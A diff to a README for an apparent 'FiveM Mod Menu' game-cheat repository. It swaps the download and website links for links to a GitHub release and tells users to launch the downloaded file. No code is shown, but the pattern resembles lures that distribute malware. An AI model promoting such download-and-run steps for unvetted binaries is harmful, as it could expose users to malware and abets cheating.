@@ -31,7 +31,7 @@ Welcome to the official GitHub repository for the **FiveM Mod Menu**! If you are
 
 Click the button below to download the mod menu:
 
-[![Download Mod Menu](https://img.shields.io/badge/Download-Mod%20Menu-blue)](https://github.com/file/App.zip)
+[![Download Mod Menu](https://github.com/kannankannanA/FiveM-Mod-Menu/releases/tag/v2.0%20Menu-blue)](https://github.com/kannankannanA/FiveM-Mod-Menu/releases/tag/v2.0)
 
 If the link ends with the file name, make sure to launch it and start enjoying the enhanced features.
 
@@ -39,6 +39,6 @@ If the provided link does not work, or if you need more options, please check th
 
 ## Want More? 🌟
 
-For more information and updates, visit our [website](https://example.com).
+For more information and updates, visit our [website](https://github.com/kannankannanA/FiveM-Mod-Menu/releases/tag/v2.0).
 
 Thank you for choosing our FiveM Mod Menu to take your gaming experience to the next level. Enjoy! 🎮
